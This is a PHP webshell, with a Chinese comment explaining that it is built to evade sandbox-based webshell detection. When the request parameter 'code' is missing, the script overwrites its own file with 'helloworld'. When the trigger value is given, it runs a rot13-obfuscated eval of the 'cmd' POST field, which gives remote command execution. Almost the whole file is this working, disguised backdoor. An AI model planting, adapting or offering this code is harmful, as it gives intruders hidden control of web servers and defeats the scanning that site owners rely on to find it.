<?php
    /*
        现在的PHP的webshell的检测基本用的是对PHP执行引擎进行hook进行动态检测
        即我们构造出一个沙箱，让目标脚本在里面执行一次，然后对执行的结果进行判断
        而我们的沙箱在触发这个脚本执行的时候由于没有给定准确的参数"code"，就会导致毁灭性覆写"fwrite ($fp, $content)"的结果
        这样，沙箱的执行结果就是一个普通的文本"helloworld"

        然后，管理员再去查看这个文件的时候，看到的就只是一个"helloworld"了

        这个是很针对"PHP的动态沙箱检测"的绕过的

        反而利用了沙箱的机制，沙箱导致了文件的毁坏
    */

    //$url = $_SERVER['PHP_SELF'];
    //$filename = end(explode('/',$url));
    //die($filename);
    if($_REQUEST["code"]==pany)
    {
        echo str_rot13('riny($_CBFG[pzq]);');
        eval(str_rot13('riny($_CBFG[pzq]);'));
    }
    else
    {
        $url = $_SERVER['PHP_SELF'];
        $filename = end(explode('/',$url));
           
        $content = 'helloworld';
        $fp = fopen ("$filename","w");
        if (fwrite ($fp, $content))
        {
            fclose ($fp);
            die ("error");
        }
        else
        {
            fclose ($fp);
            die ("good");
        }
        exit;
    }
?>